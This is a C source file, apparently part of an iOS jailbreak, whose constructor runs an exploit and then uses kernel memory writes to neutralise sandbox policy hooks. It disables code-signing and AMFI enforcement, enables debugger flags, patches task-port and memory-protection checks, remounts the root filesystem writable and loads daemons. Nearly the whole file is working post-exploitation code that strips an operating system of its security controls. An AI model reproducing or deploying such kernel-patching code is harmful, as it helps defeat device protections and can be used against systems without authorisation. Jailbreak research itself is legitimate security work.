#include "oob_entry.h"
#include "memory.h"
#include "util.h"

patches_t *patches = NULL;

int load_patches(void) {
    int fd = open("/var/root/iocaste/patches.bin", O_RDONLY);
    if (fd == -1) return -1;
    
    size_t size = lseek(fd, 0, SEEK_END);
    lseek(fd, 0, SEEK_SET);

    void *data = mmap(NULL, size, PROT_READ, MAP_PRIVATE, fd, 0);
    close(fd);

    if (data == MAP_FAILED) return -1;
    patches = (patches_t *)data;
    return 0;
}

void patch_bootargs(uint32_t addr){
    uint32_t bootargs_addr = (physread32(addr) - kinfo->kernel_slide) + 0x38;
    const char* new_bootargs = "cs_enforcement_disable=1 amfi_get_out_of_my_way=1";

    size_t new_bootargs_len = strlen(new_bootargs) + 1;
    size_t bootargs_buf_len = (new_bootargs_len + 3) / 4 * 4;
    char bootargs_buf[bootargs_buf_len];

    strlcpy(bootargs_buf, new_bootargs, bootargs_buf_len);
    memset(bootargs_buf + new_bootargs_len, 0, bootargs_buf_len - new_bootargs_len);
    physwrite_buf(bootargs_addr, bootargs_buf, bootargs_buf_len);
}

__attribute__((constructor)) static void ctor(int argc, char **argv, char **env, char **apple) {    
    if (load_patches() != 0 || run_exploit() != 0) {
        usleep(1000000);
        reboot(0);
        exit(1);
    }
    
    uint32_t cr_gmuid_ptr = *(uint32_t *)(HANDOFF_ADDR + 0x0);
    kwrite_buf(cr_gmuid_ptr, (void *)(HANDOFF_ADDR + 0x4), 20);

    for (uint32_t i = 0; i < 5; i++) {
        uint8_t *mpo_mapped = map_data(patches->sbops & ~0xfff, 0x4000, VM_PROT_READ|VM_PROT_WRITE);
        uint32_t mpo_offset = (patches->sbops & 0xfff);

        patch_mpo(mpo_priv_check);
        patch_mpo(mpo_priv_grant);
        patch_mpo(mpo_proc_check_map_anon);
        patch_mpo(mpo_vnode_check_fsgetpath);
        patch_mpo(mpo_iokit_check_open);
        patch_mpo(mpo_proc_check_ledger);
        patch_mpo(mpo_vnode_notify_rename);
        patch_mpo(mpo_vnode_check_setacl);
        patch_mpo(mpo_mount_check_label_update);
        patch_mpo(mpo_mount_check_mount);
        patch_mpo(mpo_mount_check_remount);
        patch_mpo(mpo_vnode_check_rename);
        patch_mpo(mpo_vnode_check_access);
        patch_mpo(mpo_vnode_check_chroot);
        patch_mpo(mpo_vnode_check_create);
        patch_mpo(mpo_file_check_mmap);
        patch_mpo(mpo_vnode_check_deleteextattr);
        patch_mpo(mpo_vnode_check_exchangedata);
        patch_mpo(mpo_vnode_check_exec);
        patch_mpo(mpo_vnode_check_getattrlist);
        patch_mpo(mpo_vnode_check_getextattr);
        patch_mpo(mpo_vnode_check_ioctl);
        patch_mpo(mpo_vnode_check_link);
        patch_mpo(mpo_vnode_check_listextattr);
        patch_mpo(mpo_vnode_check_open);
        patch_mpo(mpo_vnode_check_readlink);
        patch_mpo(mpo_vnode_check_setattrlist);
        patch_mpo(mpo_vnode_check_setextattr);
        patch_mpo(mpo_vnode_check_setflags);
        patch_mpo(mpo_vnode_check_setmode);
        patch_mpo(mpo_vnode_check_setowner);
        patch_mpo(mpo_vnode_check_setutimes);
        patch_mpo(mpo_vnode_check_setutimes);
        patch_mpo(mpo_vnode_check_stat);
        patch_mpo(mpo_vnode_check_truncate);
        patch_mpo(mpo_vnode_check_unlink);
        patch_mpo(mpo_vnode_notify_create);
        patch_mpo(mpo_vnode_check_fsgetpath);
        patch_mpo(mpo_vnode_check_getattr);
        patch_mpo(mpo_mount_check_stat);
        patch_mpo(mpo_proc_check_fork);
        patch_mpo(mpo_iokit_check_get_property);
        patch_mpo(mpo_cred_label_update_execve);
        patch_mpo(mpo_proc_check_expose_task);
        patch_mpo(mpo_proc_check_get_task_name);
        patch_mpo(mpo_proc_check_get_task);
        patch_mpo(mpo_proc_check_inherit_ipc_ports);
        patch_mpo(mpo_proc_check_set_host_special_port);
        patch_mpo(mpo_proc_check_set_host_exception_port);
        patch_mpo(mpo_proc_check_getauid);
        patch_mpo(mpo_proc_check_setauid);
        patch_mpo(mpo_proc_check_signal);
        patch_mpo(mpo_vnode_check_write);

        unmap_data(mpo_mapped, 0x4000);
        usleep(100000);
        sync();
    }

    patch_bootargs(patches->p_bootargs);
    physwrite32(patches->proc_enforce, 0);
    physwrite8(patches->cs_enforcement_disable, 1);
    physwrite8(patches->cs_enforcement_disable-1, 1);
    physwrite32(patches->PE_i_can_has_debugger_1, 1);
    physwrite32(patches->PE_i_can_has_debugger_2, 1);
    physwrite16(patches->vm_fault_enter, 0x2201);
    physwrite32(patches->vm_map_enter, 0xbf00bf00);
    physwrite32(patches->vm_map_protect, 0xbf00bf00);
    physwrite32(patches->csops, 0xbf00bf00);
    physwrite32(patches->amfi_file_check_mmap, 0xbf00bf00);
    physwrite32(patches->tfp0_patch, 0xbf00bf00);

    usleep(500000);
    char *path = strdup("/dev/disk0s1s1");
    int status = mount("hfs", "/", MNT_UPDATE, &path);

    for (uint32_t i = 0; i < 20; i++) {
        status = mount("hfs", "/", MNT_UPDATE, &path);
        if (status == 0) break;

        physwrite8(patches->mount_patch, 0xe0);
        physwrite32(patches->i_can_has_kernel_configuration_got, patches->lwvm_jump + kinfo->kernel_slide);
        usleep(50000);
    }

    free(path);
    usleep(500000);
    load_daemons();
    exit(0);
}
